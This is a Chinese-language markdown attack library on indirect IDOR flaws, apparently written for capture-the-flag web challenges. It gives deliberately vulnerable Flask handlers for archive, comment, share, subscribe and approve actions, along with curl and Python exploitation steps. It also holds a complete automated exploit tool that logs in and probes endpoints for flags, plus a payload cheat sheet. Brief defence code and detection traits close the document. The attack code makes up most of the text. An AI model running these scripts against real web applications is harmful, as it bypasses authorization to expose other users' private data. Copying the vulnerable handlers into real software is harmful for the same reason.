# IDOR - 间接对象引用攻击库

## 概述

间接对象引用(Indirect Object Reference)是IDOR漏洞的一种高级形式。与直接IDOR不同,间接IDOR需要攻击者先通过某个操作建立与目标资源的关系,然后利用这个关系来访问原本无权访问的资源。这种攻击通常涉及多个步骤,需要理解应用程序的业务逻辑。

**核心威胁**: 状态修改操作无权限检查 → 建立访问关系 → 利用关系访问敏感资源

## 间接IDOR vs 直接IDOR

### 直接IDOR
```bash
# 直接修改参数访问他人资源
GET /api/orders/123  # 自己的订单
GET /api/orders/456  # 他人的订单(直接访问)
```

### 间接IDOR  
```bash
# 需要先建立关系
POST /api/orders/456/archive  # 归档他人订单(无权限检查)
# 归档后成为archiver,建立了关系

GET /api/orders/456/receipt  # 现在可以访问(检查archiver权限)
```

## 核心攻击技术

### 1. 归档/标记建立关系

**技术**: 通过归档、标记、收藏等操作建立与资源的关系

```python
# 易受攻击代码
@app.route('/order/<int:order_id>/archive')
def order_archive(order_id):
    user_id = session.get('user_id')
    if user_id:
        user = User.query.get(user_id)
        order = Order.query.get(order_id)
        
        # ⚠️ 无权限检查,任何人都可以归档任何订单
        order.archiver = user
        order.archived = True
        db.session.commit()
        return "Archived"

@app.route('/order/<int:order_id>/receipt')
def order_receipt(order_id):
    user_id = session.get('user_id')
    user = User.query.get(user_id)
    order = Order.query.get(order_id)
    
    # ✅ 有权限检查,但archiver也可以访问
    if order.creator == user or order.archiver == user:
        return render_template('receipt.html', order=order)
    else:
        return "Unauthorized", 403
```

**利用流程**:
```python
import requests

s = requests.Session()
s.post('http://target/login', data={'user': 'attacker'})

# 1. 归档目标订单(成为archiver)
s.get('http://target/order/999/archive')

# 2. 访问订单收据(现在有权限了)
r = s.get('http://target/order/999/receipt')
print(r.text)  # 获取敏感信息
```

**应用场景**:
- 订单系统归档功能
- 文档标记/收藏功能
- 任务分配功能

### 2. 评论/审核建立关系

**技术**: 通过评论、审核、审批等操作成为参与者

```python
# 易受攻击代码
@app.route('/draft/<int:draft_id>/comment', methods=['POST'])
def add_comment(draft_id):
    user = get_current_user()
    draft = Draft.query.get(draft_id)
    
    # ⚠️ 无权限检查,任何人都可以评论
    comment = Comment(draft=draft, user=user, text=request.json['text'])
    db.session.add(comment)
    db.session.commit()
    return "OK"

@app.route('/draft/<int:draft_id>')
def view_draft(draft_id):
    user = get_current_user()
    draft = Draft.query.get(draft_id)
    
    # ✅ 权限检查,但评论者也可以访问
    if draft.author == user or user in draft.commenters:
        return render_template('draft.html', draft=draft)
    else:
        return "Unauthorized", 403
```

**利用**:
```bash
# 1. 添加评论(成为commenter)
curl -X POST http://target/draft/secret-123/comment \
  -H "Cookie: session=xxx" \
  -d '{"text":"test"}'

# 2. 访问草稿(现在有权限)
curl http://target/draft/secret-123 -H "Cookie: session=xxx"
```

### 3. 共享/协作建立关系

**技术**: 通过添加协作者、共享链接等方式建立访问权限

```python
# 易受攻击代码
@app.route('/project/<int:project_id>/share', methods=['POST'])
def share_project(project_id):
    project = Project.query.get(project_id)
    target_user = User.query.get(request.json['user_id'])
    
    # ⚠️ 无权限检查,任何人都可以将他人项目共享给自己
    project.shared_with.append(target_user)
    db.session.commit()
    return "Shared"

@app.route('/project/<int:project_id>')
def view_project(project_id):
    user = get_current_user()
    project = Project.query.get(project_id)
    
    # ✅ 权限检查,但shared_with用户也可以访问
    if project.owner == user or user in project.shared_with:
        return render_template('project.html', project=project)
    else:
        return "Unauthorized", 403
```

**利用**:
```python
# 1. 将目标项目共享给自己
requests.post('http://target/project/999/share', 
              json={'user_id': my_user_id},
              cookies={'session': 'xxx'})

# 2. 访问项目
requests.get('http://target/project/999', 
             cookies={'session': 'xxx'})
```

### 4. 订阅/关注建立关系

**技术**: 通过订阅、关注等功能获取访问权限

```python
# 易受攻击代码
@app.route('/channel/<int:channel_id>/subscribe', methods=['POST'])
def subscribe_channel(channel_id):
    user = get_current_user()
    channel = Channel.query.get(channel_id)
    
    # ⚠️ 无权限检查,即使是私有频道也可以订阅
    channel.subscribers.append(user)
    db.session.commit()
    return "Subscribed"

@app.route('/channel/<int:channel_id>/posts')
def view_posts(channel_id):
    user = get_current_user()
    channel = Channel.query.get(channel_id)
    
    # ✅ 权限检查,但订阅者也可以访问
    if not channel.is_private or user in channel.subscribers:
        posts = Post.query.filter_by(channel=channel).all()
        return jsonify([p.to_dict() for p in posts])
    else:
        return "Unauthorized", 403
```

### 5. 状态转换建立关系

**技术**: 利用状态转换(如pending→approved)建立访问权限

```python
# 易受攻击代码  
@app.route('/document/<int:doc_id>/approve', methods=['POST'])
def approve_document(doc_id):
    user = get_current_user()
    doc = Document.query.get(doc_id)
    
    # ⚠️ 无权限检查,任何人都可以"批准"文档
    doc.approver = user
    doc.status = 'approved'
    db.session.commit()
    return "Approved"

@app.route('/document/<int:doc_id>')
def view_document(doc_id):
    user = get_current_user()
    doc = Document.query.get(doc_id)
    
    # ✅ 权限检查,但审批人也可以访问
    if doc.author == user or doc.approver == user:
        return doc.content
    else:
        return "Unauthorized", 403
```

## 完整攻击工具

### 间接IDOR自动化利用工具

```python
#!/usr/bin/env python3
"""
间接IDOR漏洞自动化利用工具
支持归档、评论、共享等多种间接访问方式
"""

import requests
import sys
import re
from urllib.parse import urljoin

class IndirectIDOR:
    def __init__(self, base_url):
        self.base = base_url.rstrip('/')
        self.session = requests.Session()
        
    def login(self, username, password):
        """
        登录系统
        """
        print(f"[*] 登录: {username}")
        
        # 尝试多种登录端点
        login_endpoints = [
            '/login',
            '/auth/login',
            '/api/login',
        ]
        
        for endpoint in login_endpoints:
            try:
                url = urljoin(self.base, endpoint)
                r = self.session.post(url, data={
                    'username': username,
                    'password': password
                }, timeout=10)
                
                if r.status_code == 200 or 'dashboard' in r.url.lower():
                    print(f"[+] 登录成功")
                    return True
            except:
                pass
        
        print("[-] 登录失败")
        return False
    
    def test_archive_idor(self, resource_type, resource_id):
        """
        测试归档类间接IDOR
        
        Args:
            resource_type: 资源类型(order/draft/document等)
            resource_id: 资源ID
        """
        print(f"[*] 测试归档IDOR: {resource_type}/{resource_id}")
        
        # 尝试归档
        archive_urls = [
            f"/{resource_type}/{resource_id}/archive",
            f"/{resource_type}s/{resource_id}/archive",
            f"/api/{resource_type}/{resource_id}/archive",
        ]
        
        for url in archive_urls:
            try:
                full_url = urljoin(self.base, url)
                print(f"[*] 尝试归档: {url}")
                
                r = self.session.get(full_url, timeout=10)
                
                if r.status_code == 200:
                    print(f"[+] 归档成功!")
                    
                    # 尝试访问归档列表
                    archive_list_url = urljoin(self.base, f"/{resource_type}s_archive")
                    r2 = self.session.get(archive_list_url, timeout=10)
                    
                    if 'flag{' in r2.text.lower():
                        print(f"[+] 在归档列表发现FLAG!")
                        return self._extract_flag(r2.text)
                    
                    # 尝试访问资源详情
                    detail_urls = [
                        f"/{resource_type}/{resource_id}",
                        f"/{resource_type}/{resource_id}/receipt",
                        f"/{resource_type}/{resource_type_id}/detail",
                    ]
                    
                    for detail_url in detail_urls:
                        full_detail_url = urljoin(self.base, detail_url)
                        r3 = self.session.get(full_detail_url, timeout=10)
                        
                        if r3.status_code == 200 and 'flag{' in r3.text.lower():
                            print(f"[+] 在{detail_url}发现FLAG!")
                            return self._extract_flag(r3.text)
            except:
                pass
        
        return None
    
    def test_comment_idor(self, resource_type, resource_id):
        """
        测试评论类间接IDOR
        """
        print(f"[*] 测试评论IDOR: {resource_type}/{resource_id}")
        
        comment_urls = [
            f"/{resource_type}/{resource_id}/comment",
            f"/api/{resource_type}/{resource_id}/comments",
        ]
        
        for url in comment_urls:
            try:
                full_url = urljoin(self.base, url)
                print(f"[*] 尝试添加评论: {url}")
                
                # POST评论
                r = self.session.post(full_url, json={
                    'text': 'test comment',
                    'comment': 'test'
                }, timeout=10)
                
                if r.status_code in [200, 201]:
                    print(f"[+] 评论成功!")
                    
                    # 尝试访问资源
                    view_url = urljoin(self.base, f"/{resource_type}/{resource_id}")
                    r2 = self.session.get(view_url, timeout=10)
                    
                    if r2.status_code == 200:
                        if 'flag{' in r2.text.lower():
                            print(f"[+] 发现FLAG!")
                            return self._extract_flag(r2.text)
            except:
                pass
        
        return None
    
    def test_share_idor(self, resource_type, resource_id, my_user_id):
        """
        测试共享类间接IDOR
        """
        print(f"[*] 测试共享IDOR: {resource_type}/{resource_id}")
        
        share_urls = [
            f"/{resource_type}/{resource_id}/share",
            f"/api/{resource_type}/{resource_id}/share",
        ]
        
        for url in share_urls:
            try:
                full_url = urljoin(self.base, url)
                print(f"[*] 尝试共享: {url}")
                
                # 将资源共享给自己
                r = self.session.post(full_url, json={
                    'user_id': my_user_id,
                    'target_user': my_user_id
                }, timeout=10)
                
                if r.status_code in [200, 201]:
                    print(f"[+] 共享成功!")
                    
                    # 访问资源
                    view_url = urljoin(self.base, f"/{resource_type}/{resource_id}")
                    r2 = self.session.get(view_url, timeout=10)
                    
                    if r2.status_code == 200 and 'flag{' in r2.text.lower():
                        return self._extract_flag(r2.text)
            except:
                pass
        
        return None
    
    def _extract_flag(self, text):
        """
        从文本中提取FLAG
        """
        match = re.search(r'flag\{[^}]+\}', text, re.I)
        if match:
            return match.group()
        return None
    
    def full_exploit(self, username, password, target_resources):
        """
        完整利用流程
        
        Args:
            username: 用户名
            password: 密码
            target_resources: [(resource_type, resource_id), ...]
        """
        print("=" * 60)
        print("[*] 间接IDOR完整利用")
        print("=" * 60)
        
        # 1. 登录
        if not self.login(username, password):
            return False
        
        # 2. 尝试各种间接IDOR技术
        for resource_type, resource_id in target_resources:
            print(f"\n[*] 测试资源: {resource_type}/{resource_id}")
            
            # 归档IDOR
            flag = self.test_archive_idor(resource_type, resource_id)
            if flag:
                print(f"\n[+] 成功! FLAG: {flag}")
                return True
            
            # 评论IDOR
            flag = self.test_comment_idor(resource_type, resource_id)
            if flag:
                print(f"\n[+] 成功! FLAG: {flag}")
                return True
        
        return False

def exploit_indirect_idor(target_url, username='test', password='test'):
    """
    间接IDOR利用入口
    """
    print(f"[*] 目标: {target_url}")
    print()
    
    exploiter = IndirectIDOR(target_url)
    
    # 定义要测试的资源
    target_resources = [
        ('order', 300198),
        ('order', 1),
        ('draft', 1),
        ('document', 1),
    ]
    
    success = exploiter.full_exploit(username, password, target_resources)
    
    if success:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 未找到FLAG,建议手动测试")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url> [username] [password]")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target:5000")
        print(f"  {sys.argv[0]} http://target:5000 test test")
        sys.exit(1)
    
    target = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else 'test'
    password = sys.argv[3] if len(sys.argv) > 3 else 'test'
    
    exploit_indirect_idor(target, username, password)
```

## 实战场景

### 场景1: 订单归档IDOR

**目标**: 访问管理员的秘密订单

**步骤**:
```python
import requests

s = requests.Session()

# 1. 登录普通用户
s.post('http://target/login', data={'user': 'test', 'pwd': 'test'})

# 2. 归档管理员的订单(无权限检查)
s.get('http://target/order/300198/archive')

# 3. 访问归档订单列表
r = s.get('http://target/orders_archive')
# 看到管理员订单

# 4. 访问订单收据(现在有权限,因为是archiver)
r = s.get('http://target/order/300198/receipt')
print(r.text)  # FLAG在这里
```

### 场景2: 草稿评论IDOR

**目标**: 访问他人私有草稿

```bash
# 1. 登录
curl -c cookies.txt -X POST http://target/login \
  -d "username=attacker&password=pass"

# 2. 给目标草稿添加评论
curl -b cookies.txt -X POST http://target/draft/secret-123/comment \
  -H "Content-Type: application/json" \
  -d '{"text":"test"}'

# 3. 访问草稿(现在是评论者,有权限)
curl -b cookies.txt http://target/draft/secret-123
```

### 场景3: 项目共享IDOR

```python
# 1. 登录获取自己的user_id
r = requests.post('http://target/login', data={'user': 'attacker'})
my_id = extract_user_id(r.text)

# 2. 将目标项目共享给自己
requests.post('http://target/project/999/share',
              json={'user_id': my_id})

# 3. 访问项目
r = requests.get('http://target/project/999')
```

## 手动测试命令

### 归档IDOR测试

```bash
# 1. 登录
curl -c cookies.txt http://target/login -d "user=test&pwd=test"

# 2. 归档目标资源
curl -b cookies.txt http://target/order/999/archive

# 3. 查看归档列表
curl -b cookies.txt http://target/orders_archive

# 4. 访问资源详情
curl -b cookies.txt http://target/order/999/receipt
```

### 评论IDOR测试

```bash
# 添加评论
curl -b cookies.txt -X POST http://target/draft/123/comment \
  -H "Content-Type: application/json" \
  -d '{"text":"test"}'

# 访问草稿
curl -b cookies.txt http://target/draft/123
```

## Payload速查表

### 归档操作
```
GET /order/999/archive
GET /draft/123/archive
GET /document/456/archive
POST /api/resource/789/archive
```

### 评论操作
```json
POST /resource/123/comment
{"text": "test", "comment": "anything"}

POST /api/resource/123/comments
{"content": "test"}
```

### 共享操作
```json
POST /resource/123/share
{"user_id": "my_id"}

POST /project/456/collaborate
{"email": "attacker@test.com"}
```

## 防御措施

### 1. 状态修改前检查权限

```python
@app.route('/order/<int:order_id>/archive')
def order_archive(order_id):
    user = get_current_user()
    order = Order.query.get_or_404(order_id)
    
    # ✅ 检查是否有权限归档
    if order.creator != user:
        abort(403)
    
    order.archiver = user
    order.archived = True
    db.session.commit()
    return "OK"
```

### 2. 限制关系建立

```python
@app.route('/draft/<int:draft_id>/comment', methods=['POST'])
def add_comment(draft_id):
    user = get_current_user()
    draft = Draft.query.get_or_404(draft_id)
    
    # ✅ 只有已有访问权限的用户才能评论
    if draft.author != user and user not in draft.collaborators:
        abort(403)
    
    comment = Comment(draft=draft, user=user, text=request.json['text'])
    db.session.add(comment)
    return "OK"
```

### 3. 分离读写权限

```python
# 不要仅因为用户是archiver就给予读权限
# 应该分开检查
if order.creator == user:
    # 完全访问
elif order.archiver == user and user.role == 'admin':
    # 管理员archiver可以访问
else:
    # 拒绝
    abort(403)
```

## 检测特征

1. **状态修改**: POST/PUT请求修改资源状态
2. **关系建立**: 添加archiver、commenter、subscriber等字段
3. **权限变化**: 修改后可以访问之前无权访问的资源
4. **多步骤**: 需要先执行操作A,再访问资源B

## 总结

间接IDOR是一种隐蔽的权限绕过方式,主要利用点:
- 状态修改操作缺少权限检查
- 通过建立关系获取访问权限
- 需要理解业务逻辑和多步骤攻击

**关键攻击路径**: 登录 → 执行无权限检查的状态修改 → 建立访问关系 → 利用关系访问敏感资源

**防御重点**: 所有状态修改操作都必须检查权限,不能假设用户只会修改自己的资源。
